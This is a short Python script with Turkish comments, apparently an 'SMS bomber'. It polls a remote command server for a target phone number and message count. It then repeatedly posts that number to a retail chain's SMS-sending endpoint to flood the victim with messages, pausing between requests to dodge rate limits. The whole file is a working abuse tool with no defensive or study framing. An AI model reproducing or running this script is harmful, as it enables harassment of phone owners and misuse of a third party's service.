import requests
import time

# Buraya kendi render linkini yaz:
RENDER_URL = "https://kral-bomber.onrender.com/get_target"

def saldir(telefon, miktar):
    print(f"🎯 Hedef: {telefon} | Miktar: {miktar} | Saldırı başladı!")
    gonderilen = 0
    
    for i in range(int(miktar)):
        try:
            # BİM API isteği (Direkt senin IP'nden gider)
            res = requests.post("https://www.bim.com.tr/bimsms/send", json={"phone": telefon}, timeout=5)
            if res.status_code == 200:
                gonderilen += 1
                print(f"🚀 [{gonderilen}] SMS Gönderildi!")
            else:
                print(f"❌ Site cevap vermiyor (Limit dolmuş olabilir).")
            
            # Proxy'siz olduğun için BİM seni engellemesin diye araya 2 saniye koyalım:
            time.sleep(2) 
        except Exception as e:
            print(f"⚠️ Hata: {e}")
            break

print("🕶️ FATİH KRAL SİSTEMİ EMİR BEKLİYOR...")

while True:
    try:
        data = requests.get(RENDER_URL).json()
        if data['phone'] != "":
            saldir(data['phone'], data['count'])
            # Saldırı bitince hedefi sıfırlamak için Render'a bilgi gönderebilirsin
            # Şimdilik döngü devam etsin diye biz manuel durdurana kadar bekler
        time.sleep(5) 
    except:
        time.sleep(10)
